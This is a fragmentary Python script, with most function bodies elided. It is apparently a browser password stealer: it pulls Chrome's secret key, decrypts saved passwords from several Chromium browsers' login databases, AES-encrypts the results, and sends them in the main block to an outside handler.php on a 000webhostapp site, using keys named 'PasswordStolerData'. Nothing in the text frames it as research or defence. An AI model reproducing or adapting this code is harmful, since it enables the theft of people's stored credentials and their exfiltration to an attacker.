...
def get_secret_key(path_local_state):
    ...
    try:
        ...
        ouput += ("%s"%str(e)) + '\n'
        ouput += ("[ERR] Chrome secretkey cannot be found") + '\n'
        return ouput
...
def decrypt_password(ciphertext, secret_key):
    ...
    try:
        ...
        output += ("%s"%str(e)) + '\n'
        output += ("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.") + '\n'
        return output
...
def get_db_connection(chrome_path_login_db):
    ...
    try:
        ...
        output += ("%s"%str(e)) + '\n'
        output += ("[ERR] Chrome database cannot be found") + '\n'
        return output
...
def print_chromium():
    ...
    for x in browsers:
        ...
        if(os.path.exists(path_local_state)):
            output += ("-----------" + x[0] + "-----------") + '\n'
            output += get_passwords(path_local_state, path) + '\n'
    return output
...
def aes_encrypt(plaintext, key_str, iv_str):
    key = SHA256.new(key_str.encode('utf-8')).digest()
    iv = MD5.new(iv_str.encode('utf-8')).digest()
...
if __name__ == "__main__":
    ...
    try:
        ...
        sys.exit(e.exitcode)
    send_data('https://simonpucheu.000webhostapp.com/handler.php', aes_encrypt(output, 'PasswordStolerDataPassword', 'PasswordStolerDataIV'))